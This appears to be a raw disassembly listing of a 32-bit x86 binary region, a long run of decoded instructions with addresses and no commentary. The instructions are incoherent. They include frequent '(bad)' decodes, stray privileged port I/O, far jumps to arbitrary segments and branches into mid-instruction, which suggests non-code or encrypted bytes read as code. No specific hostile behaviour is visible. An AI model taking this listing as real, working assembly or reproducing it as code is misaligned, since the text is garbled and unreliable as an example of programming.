  4048b0:	xor    BYTE PTR [eax],dh
  4048b2:	push   edi
  4048b3:	loopne 0x4048bc
  4048b5:	push   ecx
  4048b6:	push   ecx
  4048b7:	jbe    0x404859
  4048b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ba:	push   0x5b74c15f
  4048bf:	sub    al,0x95
  4048c1:	repnz adc eax,esp
  4048c4:	iret   
  4048c5:	or     DWORD PTR [edx-0x23167a10],0xb1f645df
  4048cf:	sub    ebx,esp
  4048d1:	cs cmc 
  4048d3:	xchg   BYTE PTR [eax-0x51],bl
  4048d6:	and    eax,0x1c03fa50
  4048db:	fwait
  4048dc:	(bad)  
  4048dd:	mov    dl,0x17
  4048df:	cdq    
  4048e0:	or     BYTE PTR [eax+esi*4+0x4cd9d06],cl
  4048e7:	je     0x404952
  4048e9:	test   DWORD PTR [ecx+0x430124db],ebx
  4048ef:	ss cs leave 
  4048f2:	loopne 0x404910
  4048f4:	push   cs
  4048f5:	mov    WORD PTR [ebp+0xb],cs
  4048f8:	lods   al,BYTE PTR ds:[esi]
  4048f9:	int3   
  4048fa:	rcl    BYTE PTR [edx],cl
  4048fc:	lods   al,BYTE PTR ds:[esi]
  4048fd:	mov    ebp,DWORD PTR [ebp+edi*4+0x6d]
  404901:	(bad)  
  404902:	in     al,0x5c
  404904:	dec    ebp
  404905:	stos   DWORD PTR es:[edi],eax
  404906:	scas   eax,DWORD PTR es:[edi]
  404907:	inc    esp
  404908:	adc    ebx,edx
  40490a:	push   ebp
  40490b:	xchg   DWORD PTR [esi-0x18],ecx
  40490e:	shl    edi,cl
  404910:	jmp    0x3fae:0x2e718d41
  404917:	sbb    BYTE PTR [ebp-0x26],dh
  40491a:	sbb    eax,0x4c0b7caf
  40491f:	repz mov ds:0xabc75e32,eax
  404925:	imul   eax,DWORD PTR [esi],0x3799ca73
  40492b:	sub    al,0x42
  40492d:	lods   al,BYTE PTR ds:[esi]
  40492e:	ret    
  40492f:	fsubrp st(0),st
  404931:	div    DWORD PTR [eax]
  404933:	dec    esp
  404934:	sub    BYTE PTR [esi+esi*1],0x55
  404938:	daa    
  404939:	dec    edi
  40493a:	in     al,0xc5
  40493c:	adc    esp,DWORD PTR ds:0x1345449e
  404942:	inc    esp
  404943:	or     bl,BYTE PTR [edx+eax*1-0xf]
  404947:	xchg   esp,eax
  404948:	pop    esi
  404949:	cmp    bl,BYTE PTR [ebp-0x64d3c4af]
  40494f:	xchg   ebx,eax
  404950:	retf   0x40be
  404953:	xchg   ecx,eax
  404954:	or     esi,DWORD PTR [esi]
  404956:	das    
  404957:	mov    ch,0xc7
  404959:	data16 scas al,BYTE PTR es:[edi]
  40495b:	push   eax
  40495c:	push   ss
  40495d:	xchg   ebx,eax
  40495e:	mov    bl,0xdd
  404960:	pop    esi
  404962:	add    BYTE PTR [ebx-0x7eb0b830],ch
  404968:	adc    eax,0xe837c8b3
  40496d:	int3   
  40496e:	push   edi
  40496f:	data16 test al,0xbb
  404972:	mov    al,ds:0xc85a091d
  404977:	pop    edi
  404978:	mov    bl,ch
  40497a:	dec    edi
  40497b:	sbb    BYTE PTR [eax-0x781c9d11],ah
  404981:	aam    0x66
  404983:	call   0x804783b6
  404988:	cmp    dl,al
  40498a:	fnstcw WORD PTR [esi+ebx*2+0x4]
  40498e:	gs aas 
  404990:	sbb    BYTE PTR [esp+ebp*1-0x24],bl
  404994:	rcr    BYTE PTR [esp+esi*8-0x74e4a0df],cl
  40499b:	ins    DWORD PTR es:[edi],dx
  40499c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40499d:	jb     0x404a0d
  40499f:	loopne 0x4049e3
  4049a1:	pop    ss
  4049a2:	xor    BYTE PTR [ebx],dl
  4049a4:	and    eax,0x5c953830
  4049a9:	std    
  4049aa:	jp     0x404983
  4049ac:	mov    ch,0xcd
  4049ae:	mov    dl,0x29
  4049b0:	cmp    al,0x2d
  4049b2:	shl    DWORD PTR ss:[edi],1
  4049b5:	ss add BYTE PTR fs:[edx],bl
  4049b9:	mov    ch,0xc5
  4049bb:	sub    BYTE PTR [ecx-0x3],ch
  4049be:	mov    ebx,gs
  4049c0:	lock mov cl,0xd0
  4049c3:	pop    edx
  4049c4:	adc    dh,BYTE PTR [edx]
  4049c6:	dec    ebx
  4049c7:	adc    DWORD PTR [esi+ebx*4-0x7adb9ac0],eax
  4049ce:	ror    esi,cl
  4049d0:	repz fisub DWORD PTR [edi]
  4049d3:	arpl   WORD PTR [eax],cx
  4049d5:	or     BYTE PTR [edx],dl
  4049d7:	(bad)  
  4049d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d9:	fidivr DWORD PTR [ebx-0x3992ab7c]
  4049df:	dec    esi
  4049e0:	ja     0x404a3b
  4049e2:	xor    dh,dl
  4049e4:	dec    esi
  4049e5:	push   edx
  4049e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049e7:	push   eax
  4049e8:	inc    ecx
  4049e9:	mov    DWORD PTR [edx-0xa0b1b01],edi
  4049ef:	repnz add esp,DWORD PTR [edi+0x55d87a1a]
  4049f6:	in     al,0xa7
  4049f8:	inc    ebx
  4049f9:	repnz ud2 
  4049fc:	sub    eax,0x25c8abae
  404a01:	jmp    0x404a63
  404a03:	(bad)  
  404a04:	lds    ebp,FWORD PTR ds:0x259f1845
  404a0a:	pop    edi
  404a0b:	cwde   
  404a0c:	rcl    BYTE PTR ds:0x890f51c,1
  404a12:	adc    eax,0x1a54553c
  404a17:	out    0x3f,al
  404a19:	shl    BYTE PTR ds:0x666ab068,1
  404a1f:	fwait
  404a20:	and    al,0x20
  404a22:	aaa    
  404a23:	cmp    BYTE PTR [ecx],dh
  404a25:	jmp    0x404a23
  404a27:	and    eax,0x9ef13f02
  404a2c:	mov    dh,0xc0
  404a2e:	mov    eax,DWORD PTR [ecx]
  404a30:	fadd   DWORD PTR [eax-0x50]
  404a33:	and    al,0x18
  404a35:	das    
  404a36:	dec    ebp
  404a37:	add    eax,0x940c78f4
  404a3c:	push   ebx
  404a3d:	data16 ja 0x404a7e
  404a40:	jno    0x404a63
  404a42:	and    DWORD PTR [ebp-0xb7dd6d6],ebx
  404a48:	cdq    
  404a49:	and    eax,0x12254873
  404a4e:	xchg   ecx,eax
  404a4f:	add    esi,DWORD PTR [edx]
  404a51:	xor    edi,0x9ca58137
  404a57:	and    al,0xd1
  404a59:	loopne 0x404a14
  404a5b:	inc    esi
  404a5c:	(bad)  
  404a5d:	jge    0x404aaa
  404a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a60:	pusha  
  404a61:	les    ecx,FWORD PTR [edx-0x6b]
  404a64:	push   cs
  404a65:	aam    0x9f
  404a67:	mov    ecx,es
  404a69:	fdiv   st,st(7)
  404a6b:	int    0x37
  404a6d:	icebp  
  404a6e:	cmp    ecx,DWORD PTR [ebp+0x4e]
  404a71:	mov    eax,0x4e773f43
  404a76:	adc    DWORD PTR [esi+ecx*2+0x7c],esp
  404a7a:	push   ebx
  404a7b:	mov    ah,BYTE PTR [esi-0x3f]
  404a7e:	dec    esp
  404a7f:	push   ds
  404a80:	ja     0x404ad4
  404a82:	mov    ecx,0x2f8b1456
  404a87:	ds shl dh,0xe2
  404a8b:	sbb    DWORD PTR [esi+0xe],ecx
  404a8e:	mov    ecx,0xf8cad637
  404a93:	add    esi,ebp
  404a95:	pop    ebp
  404a96:	sti    
  404a97:	sar    BYTE PTR [ebx+0x36d48db7],1
  404a9d:	retf   0x1359
  404aa0:	loope  0x404a48
  404aa2:	adc    eax,0xb2974d26
  404aa7:	mov    ds:0x3972def6,al
  404aac:	sbb    eax,0x4ab48b5a
  404ab1:	dec    ebp
  404ab2:	mov    ds:0x215bf0f4,al
  404ab7:	(bad)  
  404ab8:	mov    esi,0x1d9aa677
  404abd:	mov    dl,al
  404abf:	dec    edi
  404ac0:	mov    ds:0xf454170b,eax
  404ac5:	sub    al,0xcc
  404ac7:	repz dec esi
  404ac9:	out    0x5e,eax
  404acb:	inc    eax
  404acc:	or     ecx,ebp
  404ace:	jle    0x404aca
  404ad0:	leave  
  404ad1:	test   BYTE PTR [ecx-0x4f],dh
  404ad4:	pop    esi
  404ad5:	push   ebx
  404ad6:	xor    dl,BYTE PTR [edx+0x6b05d146]
  404adc:	pop    ecx
  404add:	pop    es
  404ade:	iret   
  404adf:	fld    TBYTE PTR [esi]
  404ae1:	mov    esi,0x66a48cff
  404ae6:	mov    al,0x73
  404ae8:	mov    BYTE PTR [esi-0x64],bh
  404aeb:	cmc    
  404aec:	mov    ds:0x98c47df2,eax
  404af1:	in     eax,dx
  404af2:	and    BYTE PTR [edx+ebx*2+0xddbf1a4],bh
  404af9:	in     eax,dx
  404afa:	add    bh,BYTE PTR [edx-0x1f]
  404afd:	nop
  404afe:	sar    DWORD PTR [ecx+0x36],1
  404b01:	xchg   DWORD PTR [edi-0x65fc8ba4],edx
  404b07:	es lock daa 
  404b0a:	add    al,BYTE PTR [ebx]
  404b0c:	mov    al,0x39
  404b0e:	mov    edi,0xdb59bbc6
  404b13:	std    
  404b14:	lahf   
  404b15:	adc    DWORD PTR [esi+0x9],ecx
  404b18:	out    dx,eax
  404b19:	repz ss mov ebp,0x32504982
  404b20:	sub    eax,0xd5c2ddd2
  404b25:	mov    edi,esi
  404b27:	pop    DWORD PTR [edx]
  404b29:	stc    
  404b2a:	dec    edi
  404b2b:	xor    cl,dh
  404b2d:	cmp    eax,0x6a242a9c
  404b32:	dec    eax
  404b33:	clc    
  404b34:	and    DWORD PTR [esi+0x3c9cf96d],ebx
  404b3a:	inc    eax
  404b3b:	dec    edi
  404b3c:	mov    esp,0x28a732ac
  404b41:	add    eax,0x25f8428
  404b46:	dec    esi
  404b47:	test   bh,0x5a
  404b4a:	call   0x4146ac81
  404b4f:	xlat   BYTE PTR ds:[ebx]
  404b50:	cmc    
  404b51:	js     0x404bc6
  404b53:	dec    edx
  404b54:	adc    BYTE PTR [ebx+0x6e11a939],ah
  404b5a:	aas    
  404b5b:	mov    ecx,DWORD PTR [edi+eiz*2+0x50]
  404b5f:	icebp  
  404b60:	pusha  
  404b61:	dec    ecx
  404b62:	jb     0x404bbd
  404b64:	jno    0x404b61
  404b66:	adc    eax,0x5447e055
  404b6b:	fist   WORD PTR [edx-0x2e91536c]
  404b71:	dec    ecx
  404b72:	pop    edi
  404b73:	ins    BYTE PTR es:[edi],dx
  404b74:	imul   esi,DWORD PTR [ecx+edx*2-0x5],0x6b
  404b79:	pushf  
  404b7a:	adc    edi,ebx
  404b7c:	mov    eax,ds:0xdd0113aa
  404b81:	rcr    BYTE PTR [ebp-0x39e4c5a2],1
  404b87:	adc    BYTE PTR [edx-0x79cee452],al
  404b8d:	xchg   edx,eax
  404b8f:	movq   mm7,QWORD PTR [ecx+0x474c5e6e]
  404b96:	rol    edx,cl
  404b98:	leave  
  404b99:	mov    bh,0x6b
  404b9b:	inc    ecx
  404b9c:	adc    edi,eax
  404b9e:	mov    al,ds:0x2e4b68fb
  404ba3:	push   edx
  404ba4:	pushf  
  404ba5:	add    al,0xd5
  404ba7:	repnz call FWORD PTR [eax]
  404baa:	mov    cl,0x36
  404bac:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404bae:	adc    ah,ch
  404bb0:	ins    BYTE PTR es:[edi],dx
  404bb1:	xchg   ebp,eax
  404bb2:	sar    DWORD PTR [ecx],0x69
  404bb5:	add    al,0xe5
  404bb7:	mov    esi,DWORD PTR [edx]
  404bb9:	pop    eax
  404bba:	jbe    0x404b82
  404bbc:	jne    0x404c25
  404bbe:	fdivr  QWORD PTR [edx-0x58c8031a]
  404bc4:	js     0x404bcb
  404bc6:	dec    ecx
  404bc7:	xchg   edi,eax
  404bc8:	cwde   
  404bc9:	mov    BYTE PTR ds:0x24a191f6,al
  404bcf:	es sti 
  404bd1:	or     esi,DWORD PTR [eax+ecx*1]
  404bd4:	mov    dh,0x76
  404bd6:	sbb    dl,BYTE PTR [eax]
  404bd8:	(bad)  
  404bda:	fcomp  st(3)
  404bdc:	jecxz  0x404b6c
  404bde:	fisttp WORD PTR ds:[ebx-0x19]
  404be2:	push   es
  404be3:	ins    BYTE PTR es:[edi],dx
  404be4:	test   DWORD PTR [eax-0x2996d929],ebp
  404bea:	pusha  
  404beb:	xchg   DWORD PTR [ebx-0x2d],ebx
  404bee:	enter  0x4cb8,0xa
  404bf2:	or     al,0xf9
  404bf4:	fwait
  404bf5:	mov    WORD PTR [eax-0x6b5c0391],?
  404bfb:	pushf  
  404bfc:	add    eax,0xea9ef88
  404c01:	pop    ecx
  404c02:	aas    
  404c03:	in     eax,dx
  404c04:	cmp    DWORD PTR [ebp-0xbb7a173],ecx
  404c0a:	in     eax,0xbf
  404c0c:	cdq    
  404c0d:	add    eax,0xe99cbc5b
  404c12:	(bad)  
  404c14:	add    DWORD PTR [edi+eiz*1+0x51],ebx
  404c18:	push   ebx
  404c19:	adc    bl,BYTE PTR [ebx-0x1db4219c]
  404c1f:	and    al,0xe0
  404c21:	xlat   BYTE PTR ds:[ebx]
  404c22:	add    BYTE PTR [ebx-0x3c330203],0xd6
  404c29:	mov    WORD PTR [eax-0x247a879f],es
  404c2f:	dec    ebp
  404c30:	shl    BYTE PTR [esi],1
  404c32:	xor    BYTE PTR [esi],cl
  404c34:	leave  
  404c35:	call   0x455d:0x1a511bd
  404c3c:	pop    ebx
  404c3d:	rcl    DWORD PTR [eax-0x66c734e2],1
  404c43:	leave  
  404c44:	push   esp
  404c45:	sub    al,0x5f
  404c47:	stc    
  404c48:	xor    BYTE PTR [esp+ebx*1-0x40],dh
  404c4c:	mov    ah,0x6a
  404c4e:	or     edx,DWORD PTR [esi+0x3f73d953]
  404c54:	cld    
  404c55:	sbb    eax,0xf02fd6f7
  404c5a:	or     DWORD PTR [esi-0x725f067d],edi
  404c60:	ds loope 0x404c46
  404c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c64:	in     eax,dx
  404c65:	fisub  WORD PTR [esi]
  404c67:	fidiv  DWORD PTR [ecx+0x2a472ba7]
  404c6d:	or     al,0x90
  404c6f:	out    0x34,eax
  404c71:	fisub  DWORD PTR [edi+0x2ff5f4e0]
  404c77:	daa    
  404c78:	bound  esi,QWORD PTR [ecx+0x3a]
  404c7b:	or     al,0xe1
  404c7d:	cmp    eax,0x4121cb95
  404c82:	sub    DWORD PTR [ecx],0x43
  404c85:	mov    ds:0x27542889,al
  404c8b:	mov    ?,WORD PTR [edi+0x3abaca8f]
  404c91:	arpl   WORD PTR [ebx-0x23],bp
  404c94:	out    0x91,eax
  404c96:	cmp    al,0xc2
  404c98:	push   esp
  404c99:	sbb    eax,0x9d3f06db
  404c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c9f:	aad    0xff
  404ca1:	imul   ebx,ebp,0x2b09156
  404ca7:	or     BYTE PTR [esi+ebx*1-0x5cc6335c],ch
  404cae:	sti    
  404caf:	test   al,0xeb
  404cb1:	fcomp  QWORD PTR [ebp-0x36ce62dd]
  404cb7:	ss adc edi,esi
  404cba:	mov    ebp,fs
  404cbc:	dec    ebp
  404cbd:	aaa    
  404cbe:	inc    edx
  404cbf:	arpl   sp,di
  404cc1:	or     al,0xf4
  404cc3:	add    BYTE PTR [edi-0x9],dl
  404cc6:	call   0x6466816b
  404ccb:	jmp    0x4341:0xff26a46c
  404cd2:	shl    BYTE PTR [eax-0x7d48c433],0x60
  404cd9:	jb     0x404cf0
  404cdb:	jecxz  0x404cd4
  404cdd:	jne    0x404c66
  404cdf:	push   edx
  404ce0:	pop    ecx
  404ce1:	pop    ss
  404ce2:	inc    ecx
  404ce3:	rol    DWORD PTR [esi],cl
  404ce5:	ret    0xf0e7
  404ce8:	mov    DWORD PTR [eax+0x20],edi
  404ceb:	mov    edi,0xbc8fff26
  404cf0:	fs pop ebp
  404cf2:	aas    
  404cf3:	and    al,BYTE PTR [edx+0x4706cde5]
  404cf9:	les    ebp,FWORD PTR [ebp+0x47492f11]
  404cff:	into   
  404d00:	neg    bh
  404d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d03:	inc    esp
  404d04:	cmp    ch,BYTE PTR [esi]
  404d06:	pop    ebx
  404d07:	mov    ebp,0x97eadb28
  404d0c:	xor    BYTE PTR [edi+eax*2+0x360bf89e],0x62
  404d14:	aas    
  404d15:	sub    cl,BYTE PTR [ecx]
  404d17:	std    
  404d18:	cmp    eax,0xee4f6481
  404d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d1e:	scas   eax,DWORD PTR es:[edi]
  404d1f:	ss pop edi
  404d21:	mov    WORD PTR [esi+0x218164e],gs
  404d27:	push   0x9877c928
  404d2c:	call   0xa4f6:0x1237b72d
  404d33:	cmc    
  404d34:	sub    DWORD PTR [eax+0x53],edx
  404d37:	rol    ebx,1
  404d39:	sahf   
  404d3a:	int3   
  404d3b:	jbe    0x404d3c
  404d3d:	pop    es
  404d3e:	ja     0x404cf9
  404d40:	sub    BYTE PTR [eax+0x5dcea900],0x3
  404d47:	mov    dl,0x57
  404d49:	inc    edx
  404d4a:	not    BYTE PTR [eax]
  404d4c:	add    ah,bh
  404d4e:	mov    gs,esi
  404d50:	push   cs
  404d51:	pop    eax
  404d52:	pop    esi
  404d53:	test   esp,ebx
  404d55:	inc    DWORD PTR ds:0xa0c94283
  404d5b:	add    ah,BYTE PTR [eax+edx*4]
  404d5e:	pop    edx
  404d5f:	cli    
  404d60:	jp     0x404db9
  404d62:	xor    al,0x50
  404d64:	call   0xf14dd449
  404d69:	and    eax,esp
  404d6b:	jns    0x404dce
  404d6d:	cmp    BYTE PTR ds:0xa3f08252,al
  404d73:	xor    eax,0xe4d84d96
  404d78:	sub    ebp,esp
  404d7a:	add    ebp,edx
  404d7c:	mov    bl,0x49
  404d7e:	daa    
  404d7f:	leave  
  404d80:	inc    edi
  404d81:	push   ss
  404d82:	xlat   BYTE PTR ds:[ebx]
  404d83:	xor    al,0xbc
  404d85:	xchg   esp,eax
  404d86:	mov    eax,esi
  404d88:	xor    DWORD PTR [esi-0x5a],ebx
  404d8b:	inc    esp
  404d8c:	add    al,0x10
  404d8e:	mov    ecx,DWORD PTR [eax]
  404d90:	cmp    eax,0xf8a99ad1
  404d95:	fdiv   DWORD PTR [ebp-0x44]
  404d98:	mov    BYTE PTR [ebp+0x38],bh
  404d9b:	jle    0x404d7d
  404d9d:	psubsw mm2,QWORD PTR [esi-0x491ed8ee]
  404da4:	pop    ebx
  404da5:	pop    ebp
  404da6:	and    dl,BYTE PTR [ebx+eiz*2+0x22]
  404daa:	in     eax,0x8c
  404dac:	lods   eax,DWORD PTR ds:[esi]
  404dad:	push   cs
  404dae:	mov    dl,0x4f
  404db0:	dec    ebp
  404db1:	pop    esp
  404db2:	sbb    esi,edx
  404db4:	stc    
  404db5:	dec    ebx
  404db6:	jecxz  0x404de0
  404db8:	shl    DWORD PTR [edx+0x72],cl
  404dbb:	lahf   
  404dbc:	lahf   
  404dbd:	repz popf 
  404dbf:	idiv   ah
  404dc1:	pop    ebp
  404dc2:	out    dx,al
  404dc3:	inc    edx
  404dc4:	jns    0x404d57
  404dc6:	and    al,0x46
  404dc8:	(bad)  
  404dc9:	sti    
  404dca:	(bad)  
  404dcb:	push   0xffffff8d
  404dcd:	popf   
  404dce:	jp     0x404d5d
  404dd0:	dec    eax
  404dd1:	in     eax,dx
  404dd2:	fild   QWORD PTR [ebp-0x6ed0bf86]
  404dd8:	pop    ebp
  404dd9:	jmp    FWORD PTR fs:[eax-0x5b8c474b]
  404de0:	jge    0x404e0e
  404de2:	cmp    BYTE PTR [esi-0xf2ffb27],ah
  404de8:	aam    0xba
  404dea:	sub    ebx,ecx
  404dec:	mov    eax,0xfce577d4
  404df1:	jbe    0x404e44
  404df3:	mov    edi,0xc41342ac
  404df8:	inc    esi
  404df9:	pushf  
  404dfa:	lea    ebp,[eax-0x7111ce65]
  404e00:	hlt    
  404e01:	leave  
  404e02:	mov    ds:0x1451ec39,al
  404e07:	out    0x7c,eax
  404e09:	or     DWORD PTR [ebx-0x4],0xffffff88
  404e0d:	lea    edi,[edx]
  404e0f:	adc    al,0xa7
  404e11:	or     dh,BYTE PTR [esi]
  404e13:	mov    edi,0x5f57b88a
  404e18:	(bad)  
  404e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e1a:	imul   eax,DWORD PTR [edi+edx*1],0xc
  404e1e:	stos   DWORD PTR es:[edi],eax
  404e1f:	jno    0x404dcc
  404e21:	das    
  404e22:	leave  
  404e23:	xchg   DWORD PTR [ecx],ebp
  404e25:	aam    0xe1
  404e27:	sub    al,al
  404e29:	imul   bh
  404e2b:	xor    al,0xe7
  404e2d:	(bad)
  404e31:	adc    eax,0xa0499e53
  404e36:	xor    si,WORD PTR [esi+0x44]
  404e3a:	(bad)  
  404e3b:	pop    es
  404e3c:	add    ch,BYTE PTR [edx+0x53]
  404e3f:	fwait
  404e40:	inc    ecx
  404e41:	fild   QWORD PTR [edi]
  404e43:	xchg   edx,eax
  404e44:	cmp    eax,0xad13ad10
  404e49:	mov    eax,0x899ea7da
  404e4e:	pop    esp
  404e4f:	push   ebx
  404e50:	pushf  
  404e51:	clc    
  404e52:	push   eax
  404e53:	cli    
  404e54:	add    eax,0xc2c5d818
  404e59:	mov    esi,0x3bb4b7e8
  404e5e:	cmp    ch,BYTE PTR [eax+0x48]
  404e61:	mov    bl,bl
  404e63:	push   ecx
  404e64:	xor    al,0x10
  404e66:	fnop   
  404e68:	push   0x279cbe70
  404e6d:	retf   
  404e6e:	jno    0x404ea3
  404e70:	ins    DWORD PTR es:[edi],dx
  404e71:	jae    0x404ede
  404e73:	sbb    bl,BYTE PTR ds:0xae58c48
  404e79:	add    DWORD PTR [edi],ebx
  404e7b:	loope  0x404e97
  404e7d:	test   BYTE PTR [ecx],dh
  404e7f:	mov    ebx,0xe2a50bea
  404e84:	push   esi
  404e85:	inc    esi
  404e86:	shr    DWORD PTR [ebx-0x25],0xcc
  404e8a:	xchg   esp,eax
  404e8b:	mov    ds:0x37534b8,al
  404e90:	lods   al,BYTE PTR ds:[esi]
  404e91:	not    DWORD PTR [ebp+eiz*8-0x4ddd7368]
  404e98:	push   esi
  404e99:	jle    0x404e39
  404e9b:	cmp    esi,DWORD PTR [esi-0x4136741]
  404ea1:	mov    bl,0xcf
  404ea3:	and    DWORD PTR [edx],ecx
  404ea5:	mov    esp,ebx
  404ea7:	je     0x404e82
  404ea9:	mov    DWORD PTR [ebp+0x4e],edi
  404eac:	push   ds
  404ead:	sbb    BYTE PTR [ecx-0x631ea12b],ah
  404eb3:	adc    BYTE PTR [ebx-0x73928540],bl
  404eb9:	call   DWORD PTR [eax+0x4f]
  404ebc:	mov    dh,BYTE PTR [ebx+0x66]
  404ebf:	ss dec edx
  404ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ec2:	xor    al,0x1e
  404ec4:	aaa    
  404ec5:	or     edi,0x4e51cc51
  404ecb:	mov    al,ds:0xd43dae94
  404ed0:	test   ch,ah
  404ed2:	fmul   DWORD PTR [eax+0x38c43701]
  404ed8:	nop
  404ed9:	aad    0xd0
  404edb:	sub    BYTE PTR [esi+0x2d],al
  404ede:	lock add DWORD PTR [esi+ecx*8],ebp
  404ee2:	ret    0x7eac
  404ee5:	push   edi
  404ee6:	iret   
  404ee7:	jecxz  0x404ec0
  404ee9:	test   DWORD PTR [esi-0x4d862b52],0x4b87ad46
  404ef3:	je     0x404eff
  404ef5:	scas   al,BYTE PTR es:[edi]
  404ef6:	sub    dl,BYTE PTR [esi+0x78966435]
  404efc:	adc    ecx,0xffffff8c
  404eff:	jo     0x404f66
  404f01:	stc    
  404f02:	add    eax,0x65de2bbd
  404f07:	sub    al,BYTE PTR [ebx+0x1e2a692d]
  404f0d:	push   ebp
  404f0e:	aam    0xac
  404f10:	jns    0x404ef6
  404f12:	mov    al,0xf
  404f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f15:	push   0x23ecf901
  404f1a:	stos   DWORD PTR es:[edi],eax
  404f1b:	cs scas al,BYTE PTR es:[edi]
  404f1d:	pop    es
  404f1e:	and    BYTE PTR [edx-0x2f],cl
  404f21:	sub    ah,bh
  404f23:	sbb    al,0x5d
  404f25:	jne    0x404f49
  404f27:	iret   
  404f28:	push   0x27
  404f2a:	sbb    al,0x6e
  404f2c:	pop    es
  404f2d:	div    DWORD PTR [esi]
  404f2f:	(bad)  
  404f30:	dec    ebp
  404f31:	jae    0x404f95
  404f33:	push   cs
  404f34:	push   edi
  404f35:	add    dh,BYTE PTR [eax]
  404f37:	xchg   ecx,eax
  404f38:	add    dl,BYTE PTR [ebx+0x21078cf9]
  404f3e:	aas    
  404f3f:	sub    al,bh
  404f41:	lods   eax,DWORD PTR ds:[esi]
  404f42:	dec    esp
  404f43:	xchg   ecx,eax
  404f44:	in     eax,dx
  404f45:	adc    eax,0x7e16653c
  404f4a:	shl    DWORD PTR [ecx],cl
  404f4c:	xor    bl,BYTE PTR [esi]
  404f4e:	jmp    0x59ae:0xd4660891
  404f55:	push   esi
  404f56:	leave  
  404f57:	int3   
  404f58:	(bad)  
  404f59:	jecxz  0x404f50
  404f5b:	or     edx,DWORD PTR [esi-0x7e672811]
  404f61:	and    cl,dl
  404f63:	ja     0x404eee
  404f65:	ja     0x404f2d
  404f67:	push   esi
  404f68:	push   esi
  404f69:	or     bh,BYTE PTR [ebp+0x5f373a82]
  404f6f:	ins    DWORD PTR es:[edi],dx
  404f70:	and    eax,0x56f424c4
  404f75:	xchg   ecx,eax
  404f76:	out    0x42,al
  404f78:	inc    edi
  404f79:	xor    dh,0x1d
  404f7c:	out    0xfa,al
  404f7e:	ficom  WORD PTR [edx+0x7487eef9]
  404f84:	retf   0x2855
  404f87:	out    0x11,al
  404f89:	cmp    esi,DWORD PTR [edx+0xb]
  404f8c:	ins    BYTE PTR es:[edi],dx
  404f8d:	dec    edx
  404f8e:	mov    bl,0xd7
  404f90:	mov    BYTE PTR [edi+0x2a442b9],cl
  404f96:	xchg   edi,eax
  404f97:	add    dl,BYTE PTR ds:0x6729fe57
  404f9d:	iret   
  404f9e:	sbb    cl,cl
  404fa0:	out    dx,eax
  404fa1:	xor    eax,0xb37afcc4
  404fa6:	fisttp WORD PTR [edi+ebp*4+0x22]
  404faa:	add    cl,dh
  404fac:	push   esp
  404fad:	call   0x7671c171
  404fb2:	push   eax
  404fb3:	out    dx,eax
  404fb4:	shr    DWORD PTR [edx+0x13be91dd],0xe3
  404fbb:	jae    0x404fa4
  404fbd:	loope  0x40501c
  404fbf:	add    cl,BYTE PTR [edi-0x16f45f1f]
  404fc5:	push   esp
  404fc6:	jmp    0x404f8d
  404fc8:	cmp    ch,BYTE PTR [esi+0x72]
  404fcb:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  404fcd:	das    
  404fce:	ficom  DWORD PTR [edx]
  404fd0:	out    dx,al
  404fd1:	and    eax,0x7fd9efa4
  404fd6:	pop    ecx
  404fd7:	push   edx
  404fd8:	push   ecx
  404fd9:	jno    0x405006
  404fdb:	xor    al,0xbd
  404fdd:	jb     0x40500c
  404fdf:	retf   0xaf24
  404fe2:	and    eax,0xd9f26bf2
  404fe7:	jae    0x404ff3
  404fe9:	repz repz push cs
  404fec:	retf   
  404fed:	inc    ebp
  404fee:	push   edi
  404fef:	push   eax
  404ff0:	scas   al,BYTE PTR es:[edi]
  404ff1:	adc    eax,0xc11a5809
  404ff6:	pop    edi
  404ff7:	ret    
  404ff8:	dec    ebp
  404ff9:	and    edi,DWORD PTR [ebx+ebx*8+0x18dd11d2]
  405000:	mov    bl,0xd4
  405002:	fdivr  st(7),st
  405004:	jle    0x40507f
  405006:	test   eax,0x44ae1f44
  40500b:	or     eax,0x9a49b787
  405010:	out    0x1e,al
  405012:	aas    
  405013:	mov    ecx,0xd25f537
  405018:	int    0x4d
  40501a:	(bad)  
  40501c:	push   eax
  40501d:	in     eax,dx
  40501e:	cld    
  40501f:	or     BYTE PTR [eax],bh
  405021:	mov    edi,0x1c7c8c5b
  405026:	mov    ds:0x9a743ede,al
  40502b:	fcmovnbe st,st(2)
  40502d:	sub    eax,0x7e3452bb
  405032:	retf   
  405033:	and    DWORD PTR [ebx],eax
  405035:	pop    ss
  405036:	sub    ebx,DWORD PTR [edx+0x5b]
  405039:	shl    BYTE PTR ds:0x7352c5f1,cl
  40503f:	repnz push 0x9ed1db1d
  405045:	scas   eax,DWORD PTR es:[edi]
  405046:	mov    eax,0x16b4b8a1
  40504b:	add    ebx,esp
  40504d:	js     0x404fd6
  40504f:	sub    al,0xdc
  405051:	pushf  
  405052:	mov    DWORD PTR [edx],edi
  405054:	inc    ebp
  405055:	pushf  
  405056:	jns    0x405022
  405058:	adc    al,0xf0
  40505a:	shl    DWORD PTR [ebx+0x35],1
  40505d:	imul   ecx,eax,0x6e3c866a
  405063:	dec    ecx
  405064:	mov    bl,0xf3
  405066:	inc    esi
  405067:	xchg   edi,eax
  405068:	push   0xffffff8c
  40506a:	shl    DWORD PTR [esi-0x78e0298c],0xeb
  405071:	push   cs
  405072:	cmp    cl,BYTE PTR [ecx+0x581e75d8]
  405078:	(bad)  
  405079:	and    DWORD PTR [ebx-0x7],esi
  40507c:	arpl   WORD PTR [edx+0x26b5c565],cx
  405082:	ret    0x50bd
  405085:	xor    ebx,eax
  405087:	jns    0x405014
  405089:	adc    eax,DWORD PTR [edi+edx*8-0x69411441]
  405090:	pop    edx
  405091:	loope  0x4050b2
  405093:	mov    esp,0xac7ec3ef
  405098:	dec    esi
  405099:	test   bh,bl
